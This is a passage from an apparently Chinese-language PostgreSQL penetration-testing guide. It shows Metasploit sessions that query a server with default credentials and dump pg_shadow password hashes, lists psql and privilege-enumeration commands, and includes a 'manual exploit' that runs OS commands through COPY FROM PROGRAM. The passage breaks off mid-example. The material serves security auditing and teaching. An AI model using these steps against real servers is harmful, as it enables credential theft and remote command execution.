</span></span><span class=line><span class=cl>&gt; Enter all the right info
</span></span><span class=line><span class=cl>&gt; &#34;Ping Server&#34;
</span></span><span class=line><span class=cl>&gt; &#34;Connect&#34;
</span></span></code></pre></td></tr></table></div></div><h3 id=metasploit-postgresql-server-generic-query-module><span class=section-num>6.3</span> * Metasploit - &lsquo;PostgreSQL Server Generic Query&rsquo; module</h3><p>此模块允许在拥有适当凭证的前提下，针对 PostgreSQL 实例执行简单的 SQL 语句。</p><ul><li>auxiliary/admin/postgres/postgres_sql</li><li><a href=https://www.rapid7.com/db/modules/auxiliary/admin/postgres/postgres_sql target=_blank rel="noopener noreffer">https://www.rapid7.com/db/modules/auxiliary/admin/postgres/postgres_sql</a></li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>msf5 auxiliary(admin/postgres/postgres_sql) &gt; options
</span></span><span class=line><span class=cl>Module options (auxiliary/admin/postgres/postgres_sql):
</span></span><span class=line><span class=cl>   Name           Current Setting   Required  Description
</span></span><span class=line><span class=cl>   ----           ---------------   --------  -----------
</span></span><span class=line><span class=cl>   DATABASE       template1         yes       The database to authenticate against
</span></span><span class=line><span class=cl>   PASSWORD       postgres          no        The password for the specified username. Leave blank for a random password.
</span></span><span class=line><span class=cl>   RETURN_ROWSET  true              no        Set to true to see query result sets
</span></span><span class=line><span class=cl>   RHOSTS         192.168.1.26      yes       The target address range or CIDR identifier
</span></span><span class=line><span class=cl>   RPORT          5432              yes       The target port
</span></span><span class=line><span class=cl>   SQL            select version()  no        The SQL query to execute
</span></span><span class=line><span class=cl>   USERNAME       postgres          yes       The username to authenticate as
</span></span><span class=line><span class=cl>   VERBOSE        false             no        Enable verbose output
</span></span><span class=line><span class=cl>msf5 auxiliary(admin/postgres/postgres_sql) &gt; run
</span></span><span class=line><span class=cl>Query Text: &#39;select version()&#39;
</span></span><span class=line><span class=cl>==============================
</span></span><span class=line><span class=cl>    version
</span></span><span class=line><span class=cl>    -------
</span></span><span class=line><span class=cl>    PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
</span></span><span class=line><span class=cl>[*] Auxiliary module execution completed
</span></span><span class=line><span class=cl>msf5 auxiliary(admin/postgres/postgres_sql) &gt; options
</span></span><span class=line><span class=cl>Module options (auxiliary/admin/postgres/postgres_sql):
</span></span><span class=line><span class=cl>   Name           Current Setting                                             Required  Description
</span></span><span class=line><span class=cl>   ----           ---------------                                             --------  -----------
</span></span><span class=line><span class=cl>   DATABASE       template1                                                   yes       The database to authenticate against
</span></span><span class=line><span class=cl>   PASSWORD       postgres                                                    no        The password for the specified username. Leave blank for a random password.
</span></span><span class=line><span class=cl>   RETURN_ROWSET  true                                                        no        Set to true to see query result sets
</span></span><span class=line><span class=cl>   RHOSTS         192.168.1.26                                                yes       The target address range or CIDR identifier
</span></span><span class=line><span class=cl>   RPORT          5432                                                        yes       The target port
</span></span><span class=line><span class=cl>   SQL            SELECT usename, usesysid, usesuper, passwd FROM pg_shadow;  no        The SQL query to execute
</span></span><span class=line><span class=cl>   USERNAME       postgres                                                    yes       The username to authenticate as
</span></span><span class=line><span class=cl>   VERBOSE        false                                                       no        Enable verbose output
</span></span><span class=line><span class=cl>msf5 auxiliary(admin/postgres/postgres_sql) &gt; run
</span></span><span class=line><span class=cl>Query Text: &#39;SELECT usename, usesysid, usesuper, passwd FROM pg_shadow;&#39;
</span></span><span class=line><span class=cl>========================================================================
</span></span><span class=line><span class=cl>    usename   usesysid  usesuper  passwd
</span></span><span class=line><span class=cl>    -------   --------  --------  ------
</span></span><span class=line><span class=cl>    postgres  10        t         md53175bce1d3201d16594cebf9d7eb3f9d
</span></span><span class=line><span class=cl>[*] Auxiliary module execution completed
</span></span></code></pre></td></tr></table></div></div><h2 id=如何识别并利用数据库和操作系统权限提升漏洞><span class=section-num>7</span> 如何识别并利用数据库和操作系统权限提升漏洞</h2><h3 id=检查各种有用信息-比如用户列表-数据库密码策略-谁是数据管理员等><span class=section-num>7.1</span> 检查各种有用信息（比如用户列表、数据库密码策略、谁是数据管理员等）</h3><h4 id=一些有趣的标志><span class=section-num>7.1.1</span> 一些有趣的标志</h4><p>要查看全部，请根据 psql 版本使用 <code>-h</code> 或 <code>--help</code> ）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zed data-lang=zed><span class=line><span class=cl><span class=o>-</span><span class=n>E</span><span class=o>:</span><span class=w> </span><span class=n>will</span><span class=w> </span><span class=n>describe</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=n>underlaying</span><span class=w> </span><span class=n>queries</span><span class=w> </span><span class=n>of</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=err>\</span><span class=w> </span><span class=n>commands</span><span class=w> </span><span class=p>(</span><span class=n>cool</span><span class=w> </span><span class=n>for</span><span class=w> </span><span class=n>learning</span><span class=o>!</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>-</span><span class=n>l</span><span class=o>:</span><span class=w> </span><span class=n>psql</span><span class=w> </span><span class=n>will</span><span class=w> </span><span class=n>list</span><span class=w> </span><span class=n>all</span><span class=w> </span><span class=n>databases</span><span class=w> </span><span class=n>and</span><span class=w> </span><span class=n>then</span><span class=w> </span><span class=n>exit</span><span class=w> </span><span class=p>(</span><span class=n>useful</span><span class=w> </span><span class=n>if</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=n>user</span><span class=w> </span><span class=n>you</span><span class=w> </span><span class=n>connect</span><span class=w> </span><span class=n>with</span><span class=w> </span><span class=n>doesn</span><span class=err>&#39;</span><span class=n>t</span><span class=w> </span><span class=n>has</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=n>default</span><span class=w> </span><span class=n>database</span><span class=p>,</span><span class=w> </span><span class=n>like</span><span class=w> </span><span class=n>at</span><span class=w> </span><span class=n>AWS</span><span class=w> </span><span class=n>RDS</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>&#34;\</span><span class=n>d</span><span class=err>&#34;</span><span class=w> </span><span class=n>commands</span><span class=w> </span><span class=n>support</span><span class=w> </span><span class=n>additional</span><span class=w> </span><span class=n>param</span><span class=w> </span><span class=n>of</span><span class=w> </span><span class=n>__schema__</span><span class=p>.</span><span class=n>name__</span><span class=w> </span><span class=n>and</span><span class=w> </span><span class=n>accept</span><span class=w> </span><span class=n>wildcards</span><span class=w> </span><span class=n>like</span><span class=w> </span><span class=o>*</span><span class=p>.</span><span class=o>*</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>\</span><span class=n>q</span><span class=o>:</span><span class=w> </span><span class=nn>Quit/</span><span class=n>Exit</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>\</span><span class=n>c</span><span class=w> </span><span class=n>__database__</span><span class=w>		</span><span class=n>Connect</span><span class=w> </span><span class=n>to</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=n>database</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>\</span><span class=n>d</span><span class=w> </span><span class=n>__table__</span><span class=w>		</span><span class=n>Show</span><span class=w> </span><span class=n>table</span><span class=w> </span><span class=kt>definition</span><span class=w> </span><span class=n>including</span><span class=w> </span><span class=n>triggers</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>\</span><span class=n>d</span><span class=o>+</span><span class=w> </span><span class=n>__table__</span><span class=w>		</span><span class=n>More</span><span class=w> </span><span class=n>detailed</span><span class=w> </span><span class=n>table</span><span class=w> </span><span class=kt>definition</span><span class=w> </span><span class=n>including</span><span class=w> </span><span class=n>description</span><span class=w> </span><span class=n>and</span><span class=w> </span><span class=n>physical</span><span class=w> </span><span class=n>disk</span><span class=w> </span><span class=n>size</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>\</span><span class=n>l</span><span class=w>				</span><span class=n>List</span><span class=w> </span><span class=n>databases</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>\</span><span class=n>dy</span><span class=w>			</span><span class=n>List</span><span class=w> </span><span class=n>events</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>\</span><span class=n>df</span><span class=w> 			</span><span class=n>List</span><span class=w> </span><span class=n>functions</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>\</span><span class=n>di</span><span class=w> 			</span><span class=n>List</span><span class=w> </span><span class=n>indexes</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>\</span><span class=n>dn</span><span class=w> 			</span><span class=n>List</span><span class=w> </span><span class=n>schemas</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>\</span><span class=n>dt</span><span class=w> </span><span class=o>*</span><span class=p>.</span><span class=o>*</span><span class=w> 			</span><span class=n>List</span><span class=w> </span><span class=n>tables</span><span class=w> </span><span class=n>from</span><span class=w> </span><span class=n>all</span><span class=w> </span><span class=n>schemas</span><span class=w> </span><span class=p>(</span><span class=n>if</span><span class=w> </span><span class=o>*</span><span class=p>.</span><span class=o>*</span><span class=w> </span><span class=n>is</span><span class=w> </span><span class=n>omitted</span><span class=w> </span><span class=n>will</span><span class=w> </span><span class=n>only</span><span class=w> </span><span class=n>show</span><span class=w> </span><span class=n>SEARCH_PATH</span><span class=w> </span><span class=n>ones</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>\</span><span class=n>dT</span><span class=o>+</span><span class=w> 			</span><span class=n>List</span><span class=w> </span><span class=n>all</span><span class=w> </span><span class=n>data</span><span class=w> </span><span class=n>types</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>\</span><span class=n>dv</span><span class=w>			</span><span class=n>List</span><span class=w> </span><span class=n>views</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>\</span><span class=n>du</span><span class=w>			</span><span class=n>List</span><span class=w> </span><span class=n>of</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=n>and</span><span class=w> </span><span class=n>roles</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>\</span><span class=n>df</span><span class=o>+</span><span class=w> </span><span class=n>__function__</span><span class=w>  	</span><span class=n>Show</span><span class=w> </span><span class=n>function</span><span class=w> </span><span class=n>SQL</span><span class=w> </span><span class=n>code</span><span class=p>.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>\</span><span class=n>x</span><span class=w> 			</span><span class=n>Pretty</span><span class=o>-</span><span class=n>format</span><span class=w> </span><span class=n>query</span><span class=w> </span><span class=n>results</span><span class=w> </span><span class=n>instead</span><span class=w> </span><span class=n>of</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=n>not</span><span class=o>-</span><span class=n>so</span><span class=o>-</span><span class=n>useful</span><span class=w> </span><span class=n>ASCII</span><span class=w> </span><span class=n>tables</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>\</span><span class=n>copy</span><span class=w> </span><span class=p>(</span><span class=n>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>FROM</span><span class=w> </span><span class=n>__table_name__</span><span class=p>)</span><span class=w> </span><span class=n>TO</span><span class=w> </span><span class=err>&#39;</span><span class=n>file_path_and_name</span><span class=p>.</span><span class=n>csv</span><span class=err>&#39;</span><span class=w> </span><span class=n>WITH</span><span class=w> </span><span class=n>CSV</span><span class=o>:</span><span class=w> </span><span class=n>Export</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=n>table</span><span class=w> </span><span class=n>as</span><span class=w> </span><span class=n>CSV</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>\</span><span class=n>i</span><span class=w> </span><span class=n>filename</span><span class=w>		</span><span class=n>Execute</span><span class=w> </span><span class=n>psql</span><span class=w> </span><span class=n>commands</span><span class=w> </span><span class=n>from</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=n>file</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>\</span><span class=n>q</span><span class=w>				</span><span class=n>Quit</span><span class=w> </span><span class=n>psql</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=user-related><span class=section-num>7.1.2</span> User Related:</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>\du 								List users and roles
</span></span><span class=line><span class=cl>\du username 							List a username if present.
</span></span><span class=line><span class=cl>create role __test1__ 						Create a role with an existing username.
</span></span><span class=line><span class=cl>create role __test2__ noinherit login password __passsword__; 	Create a role with username and password.
</span></span><span class=line><span class=cl>set role __test__; 						Change role for current session to __test__.
</span></span><span class=line><span class=cl>grant __test2__ to __test1__; 					Allow __test1__ to set its role as __test2__.
</span></span></code></pre></td></tr></table></div></div><h4 id=to-display-the-privileges-of-a-specific-suer><span class=section-num>7.1.3</span> To display the privileges of a specific suer</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>table_catalog</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>table_schema</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>table_name</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>privilege_type</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>FROM</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>information_schema</span><span class=p>.</span><span class=n>table_privileges</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>WHERE</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>grantee</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;example_user&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=useful-sql-queries><span class=section-num>7.1.4</span> Useful SQL queries</h4><table><thead><tr><th>查询语句</th><th>作用</th></tr></thead><tbody><tr><td>SELECT * FROM pg_user;</td><td>Display the privileges of each user</td></tr><tr><td>SELECT * FROM pg_roles;</td><td>Display the database roles of each user</td></tr><tr><td>SELECT VERSION();</td><td>Display the database version</td></tr><tr><td>\\connect db_name</td><td>Change current database</td></tr><tr><td>SELECT * FROM pg_shadow;</td><td>Extract the password hashes</td></tr><tr><td>pg_dump -Fc dbname > filename</td><td>Back up a database (database backups are compressed by default)</td></tr><tr><td>pg_restore -d dbname filename</td><td>Restore from backup</td></tr><tr><td>GRANT pg_read_server_files TO test_user;</td><td>Grant privileges to a user</td></tr><tr><td>SELECT * FROM pg_shadow;</td><td>Dump the database password hashes</td></tr></tbody></table><h4 id=default-roles><span class=section-num>7.1.5</span> Default Roles</h4><table><thead><tr><th>角色</th><th>允许的访问权限</th></tr></thead><tbody><tr><td>pg_read_all_settings</td><td>读取所有配置变量，包括通常只对超级用户可见的变量。</td></tr><tr><td>pg_read_all_stats</td><td>读取所有 pg_stat_/ 视图并使用各种与统计信息相关的扩展，包括通常只对超级用户可见的内容。</td></tr><tr><td>pg_stat_scan_tables</td><td>执行可能对表施加 ACCESS SHARE 锁的监控功能，这些锁可能会持续很长时间。</td></tr><tr><td>pg_monitor</td><td>读取和执行各种监控视图和函数。这个角色是 pg_read_all_settings、pg_read_all_stats 和 pg_stat_scan_tables 的成员。</td></tr><tr><td>pg_signal_backend</td><td>向另一个后端发送信号以取消查询或终止其会话。</td></tr><tr><td>pg_read_server_files</td><td>使用 COPY 和其他文件访问功能读取服务器上数据库可以访问的任何位置的文件。</td></tr><tr><td>pg_write_server_files</td><td>使用 COPY 和其他文件访问功能在服务器上数据库可以访问的任何位置写入文件。</td></tr><tr><td>pg_execute_server_program</td><td>作为运行数据库的用户，在服务器上执行程序，以及执行允许在服务器端运行程序的 COPY 和其他函数。</td></tr></tbody></table><h4 id=role-attributes><span class=section-num>7.1.6</span> Role Attributes</h4><p>一个数据库角色可以具备多个属性，这些属性定义了它的权限以及与客户端认证系统的交互方式。</p><ul><li><p>登录权限（login privilege）：</p><ul><li>只有具有 LOGIN 属性的角色才能作为数据库连接的初始角色名称。</li><li>拥有 LOGIN 属性的角色可以被视为“数据库用户”。</li><li>要创建一个带有登录权限的角色，可以使用“CREATE ROLE name LOGIN;”或者“CREATE USER name;”。</li></ul></li><li><p>“超级用户”状态（&lsquo;superuser&rsquo; status）：</p><ul><li>“超级用户”（&lsquo;superuser&rsquo;）可以绕过所有权限检查，但 <strong>不包括登录权限</strong> 。</li><li>这是一个危险的特权，*切勿滥加利用* ，最好是利用非超级用户角色完成大多数工作 。</li><li>要创建一个新的数据库超级用户，就使用“CREATE ROLE name SUPERUSER”。</li><li>必须以已经是超级用户的角色来执行这一操作。</li></ul></li></ul><h4 id=list-of-roles-users><span class=section-num>7.1.7</span> List of roles/users</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>postgres=# \du
</span></span><span class=line><span class=cl>                List of roles
</span></span><span class=line><span class=cl>Role name     |                         Attributes                         | Member of
</span></span><span class=line><span class=cl>---------------+------------------------------------------------------------+-----------
</span></span><span class=line><span class=cl>auditor       | Superuser, Replication                                     | {}
</span></span><span class=line><span class=cl>doadmin       | Create role, Create DB, Replication, Bypass RLS            | {}
</span></span><span class=line><span class=cl>postgres      | Superuser, Create role, Create DB, Replication, Bypass RLS | {}
</span></span><span class=line><span class=cl>user	      | 					                   | {}
</span></span></code></pre></td></tr></table></div></div><p>Note:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>create</span><span class=w> </span><span class=k>role</span><span class=w> </span><span class=n>pentester</span><span class=w> </span><span class=n>nosuperuser</span><span class=w> </span><span class=n>login</span><span class=w> </span><span class=k>nocreatedb</span><span class=w> </span><span class=n>nocreaterole</span><span class=w> </span><span class=n>Password</span><span class=w> </span><span class=s1>&#39;Password1&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>create</span><span class=w> </span><span class=k>role</span><span class=w> </span><span class=n>auditor</span><span class=w> </span><span class=n>nosuperuser</span><span class=w> </span><span class=n>login</span><span class=w> </span><span class=k>nocreatedb</span><span class=w> </span><span class=n>nocreaterole</span><span class=w> </span><span class=n>Password</span><span class=w> </span><span class=s1>&#39;Password1&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=metasploit-postgres-schema-dump-module><span class=section-num>7.1.8</span> Metasploit - &lsquo;Postgres Schema Dump&rsquo; module</h4><p>这个模块可以从 PostgreSQL 数据库服务器中提取模式信息。</p><ul><li>auxiliary/scanner/postgres/postgres_schemadump</li><li><a href=https://www.rapid7.com/db/modules/auxiliary/scanner/postgres/postgres_schemadump target=_blank rel="noopener noreffer">https://www.rapid7.com/db/modules/auxiliary/scanner/postgres/postgres_schemadump</a></li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>msf5 auxiliary(scanner/postgres/postgres_schemadump) &gt; options
</span></span><span class=line><span class=cl>Module options (auxiliary/scanner/postgres/postgres_schemadump):
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Name             Current Setting  Required  Description
</span></span><span class=line><span class=cl>   ----             ---------------  --------  -----------
</span></span><span class=line><span class=cl>   DATABASE         postgres         yes       The database to authenticate against
</span></span><span class=line><span class=cl>   DISPLAY_RESULTS  true             yes       Display the Results to the Screen
</span></span><span class=line><span class=cl>   PASSWORD         postgres         no        The password for the specified username. Leave blank for a random password.
</span></span><span class=line><span class=cl>   RHOSTS                            yes       The target address range or CIDR identifier
</span></span><span class=line><span class=cl>   RPORT            5432             yes       The target port
</span></span><span class=line><span class=cl>   THREADS          1                yes       The number of concurrent threads
</span></span><span class=line><span class=cl>   USERNAME         postgres         yes       The username to authenticate as
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>msf5 auxiliary(scanner/postgres/postgres_schemadump) &gt; set RHOSTS 192.168.1.26
</span></span><span class=line><span class=cl>RHOSTS =&gt; 192.168.1.26
</span></span><span class=line><span class=cl>msf5 auxiliary(scanner/postgres/postgres_schemadump) &gt; run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[+] Postgres SQL Server Schema
</span></span><span class=line><span class=cl> Host: 192.168.1.26
</span></span><span class=line><span class=cl> Port: 5432
</span></span><span class=line><span class=cl> ====================
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- []
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[*] Scanned 1 of 1 hosts (100% complete)
</span></span><span class=line><span class=cl>[*] Auxiliary module execution completed
</span></span></code></pre></td></tr></table></div></div><h4 id=audit-tool-postgresql-stig-compliance-validator--pgstigcheck><span class=section-num>7.1.9</span> Audit Tool - PostgreSQL STIG Compliance Validator (pgStigCheck)</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>=&gt; PostgreSQL STIG Compliance Validator (pgStigCheck) for InSpec is an open source compliance testing solution for PostgreSQL.
</span></span><span class=line><span class=cl>=&gt; The PostgreSQL Security Technical Implementation Guide (STIG) by the United States Defense Information Systems Agency (DISA) offers security-conscious enterprises a comprehensive guide for the configuration and operation of open source PostgreSQL.
</span></span><span class=line><span class=cl>=&gt; https://github.com/CrunchyData/pgstigcheck-inspec
</span></span></code></pre></td></tr></table></div></div><h3 id=数据库和操作系统提升权限-使用-从程序复制-copy-from-program-执行操作系统命令><span class=section-num>7.2</span> 数据库和操作系统提升权限 - 使用“从程序复制（COPY FROM PROGRAM）”执行操作系统命令</h3><ul><li>COPY .. PROGRAM 功能明确指出，只有被授予了 &lsquo;superuser&rsquo; 特权或者默认角色 &lsquo;pg_execute_server_program&rsquo;
的数据库用户才能够执行这个功能。</li><li>根据设计，这个功能使得那些被授予了 &lsquo;superuser&rsquo; 或者 &lsquo;pg_execute_server_program&rsquo; 的用户，能够以 PostgreSQL
服务器运行在底层的操作系统的身份（一般身份是 “postgres”）来执行操作。</li><li>默认情况下，这个功能处于启用状态，修改者可以修改、滥用这个功能，在 Windows、Linux 和 macOS 上运行任意的操作系统指令。</li><li>在 PostgreSQL 9.3 中添加的 COPY .. PROGRAM 功能，没有改变前面所说的任何一点，而是在已经存在的相同的安全边界内，添加了一个新的命令。</li><li>引文指出，在 PostgreSQL 中，超级用户可以在丝毫不使用 &lsquo;COPY FROM PROGRAM&rsquo; 的情况下，以服务器身份来执行检测操作系统命令。</li></ul><h4 id=manual-exploit><span class=section-num>7.2.1</span> Manual exploit</h4><ul><li><p>使用函数 <code>COPY TO/FROM PROGRAM</code> 执行操作系统命令的 SQL 查询</p><ul><li><p><code>DROP TABLE IF EXISTS cmd_exec;</code></p></li><li><p><code>CREATE TABLE cmd_exec(cmd_output text);</code></p></li><li><p><code>COPY cmd_exec FROM PROGRAM ‘id’;</code></p></li><li><p><code>SELECT * FROM cmd_exec;</code></p></li><li><p><code>DROP TABLE IF EXISTS cmd_exec;</code></p><p>Example:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@Security-Audit-01:~# psql -h 192.168.1.104 -U postgres -W
</span></span><span class=line><span class=cl>Password <span class=k>for</span> user postgres:
</span></span><span class=line><span class=cl>psql <span class=o>(</span>10.4 <span class=o>(</span>Debian 10.4-2<span class=o>)</span>, server 9.3.4<span class=o>)</span>
</span></span><span class=line><span class=cl>Type <span class=s2>&#34;help&#34;</span> <span class=k>for</span> help.
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>postgres</span><span class=o>=#</span><span class=w> </span><span class=k>CREATE</span><span class=w> </span><span class=k>TABLE</span><span class=w> </span><span class=n>cmd_exec</span><span class=p>(</span><span class=n>cmd_output</span><span class=w> </span><span class=nb>text</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>CREATE</span><span class=w> </span><span class=k>TABLE</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>postgres</span><span class=o>=#</span><span class=w> </span><span class=k>COPY</span><span class=w> </span><span class=n>cmd_exec</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>PROGRAM</span><span class=w> </span><span class=s1>&#39;id&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>COPY</span><span class=w> </span><span class=mi>1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>postgres</span><span class=o>=#</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>cmd_exec</span><span class=p>;</span><span class=w>
